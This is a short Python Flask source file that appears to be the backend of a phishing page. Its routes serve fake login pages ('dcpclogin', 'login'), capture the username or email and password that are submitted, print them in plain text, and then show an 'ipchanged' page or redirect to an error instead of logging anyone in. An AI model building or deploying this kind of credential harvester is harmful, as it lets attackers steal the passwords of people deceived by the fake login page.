from flask import Flask, render_template, redirect, request

app = Flask(__name__)

@app.route("/", methods=["GET", "POST"])
def dcpclogin():
    # Serve dcpclogin.html when accessing the root URL
        return render_template("dcpclogin.html")

@app.route("/ipchanged", methods=["POST"])
def redirect_to_ipchanged():
    # Capture the form data from dcpclogin.html
    username = request.form.get("username")
    password = request.form.get("password")
    
    # Process the data (for example, print it)
    print(f"Username: {username}, Password: {password}")

    # Render ipchanged.html and pass the credentials
    return render_template("ipchanged.html", username=username, password=password)

@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        # Capture form data from the login page
        email = request.form.get("email")
        password = request.form.get("password")

        # Process the data (for example, print or validate)
        print(f"Login - Username: {email}, Password: {password}")

        # Redirect to ipchanged.html after processing the form
        return redirect("error")
    
    # Render login.html if GET request
    return render_template("login.html")

if __name__ == "__main__":
    app.run(debug=True)
